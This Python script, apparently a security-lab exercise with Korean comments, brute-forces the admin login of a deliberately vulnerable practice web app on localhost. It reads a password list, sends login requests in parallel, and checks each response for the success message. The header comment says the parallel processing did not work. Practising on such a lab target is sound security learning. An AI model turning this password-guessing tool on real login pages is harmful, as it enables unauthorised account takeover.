'''
brut force에는 성공했지만 병렬처리에는 실패
'''

from multiprocessing import Pool
import requests
import time


def session_set():
    url = "http://localhost/login.php"
    s = requests.Session()
    login_info = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": "1d443097f2d12b81256f03163f74484c"
    }

    s.post(url, data=login_info)
    for cookie in s.cookies:
        if cookie.name == 'PHPSESSID':
            phpsessid = cookie.value
            return phpsessid


def read_file(filename):
    tasks = []
    with open(filename, 'r') as file:
        for line in file:
            tasks.append([line.strip()])  # 각 문자열을 리스트로 감싸서 추가
    return tasks


def brut_force(passwordList):
    phpsessid = session_set()
    url = "http://localhost/vulnerabilities/brute/"
    level = "medium"
    head = {"PHPSESSID":f"{phpsessid}", "security":f"{level}"}
    print(phpsessid)


    for password in passwordList:
        param = f"?username=admin&password={password}&Login=Login"
        payload = url+param
        print("input password:",password)
        response = requests.get(payload, cookies=head)
        print(response.status_code)
        # print(response.cookies)
        # print(response.text)
        if (response.status_code == 200 and 'Welcome to the password protected area' in response.text):
            return password
    



# # TEST 병렬처리O
if __name__ == '__main__':
    start = int(time.time())
    num_cores = 8
    pool = Pool(num_cores)
    filename = 'tools/passwordlist.txt'
    tasks = read_file(filename)
    results = pool.map(brut_force, tasks)
    end = int(time.time())

    for result in results:
        print(result)
    print(f"걸린시간: {end-start}sec.")


# TEST 병렬처리X
# start = int(time.time())
# filename = 'tools/passwordlist1.txt'
# tasks = read_file(filename)
# print(brut_force(tasks))
# end = int(time.time())
# print(f"걸린시간: {end-start}sec.")


# 코어 수 확인
# import multiprocessing

# num_cores = multiprocessing.cpu_count()
# print(f"시스템의 CPU 코어 수: {num_cores}")
